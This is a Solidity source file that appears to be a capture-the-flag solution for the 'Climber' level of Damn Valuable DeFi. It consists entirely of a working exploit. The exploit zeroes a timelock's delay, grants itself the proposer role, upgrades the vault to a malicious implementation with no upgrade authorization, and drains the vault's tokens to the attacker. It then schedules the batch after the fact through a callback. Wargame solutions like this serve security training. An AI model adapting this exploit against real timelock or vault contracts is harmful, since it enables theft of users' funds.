// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "../DamnValuableToken.sol";
import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract Puppet is UUPSUpgradeable{
    DamnValuableToken immutable token;

    constructor (address _token) {
        token = DamnValuableToken(_token);
    }

    function transfer(address owner, uint256 amount) external {
        token.transfer(owner, amount);
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

import "hardhat/console.sol";
contract ClimberVaultExploiter {
    address immutable owner;
    Puppet puppet;
    DamnValuableToken immutable token;
    ClimberTimelock timelock;
    ClimberVault vault;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt = bytes32(0);

    receive() external payable {}

    constructor(address tokenAddress, address payable timelockAddress, address vaultAddress) {
        owner = msg.sender;
        token = DamnValuableToken(tokenAddress);
        timelock = ClimberTimelock(timelockAddress);
        vault = ClimberVault(vaultAddress);
        puppet = new Puppet(tokenAddress);
    }

    function exploit() external {
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);
        
        // First, reset delay
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
        // Second, add proposer
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            AccessControl.grantRole.selector,
            timelock.PROPOSER_ROLE(),
            address(this)
        );
        // Third, upgrade vault and execute token transfer
        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(puppet),
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                owner,
                token.balanceOf(address(vault))
            )
        );
        // Finally, callback here to propose
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(ClimberVaultExploiter.callback.selector);

        timelock.execute(
            targets,
            values,
            dataElements,
            salt
        );
    }

    function callback() external payable {
        timelock.schedule(targets, values, dataElements, salt);
    }
}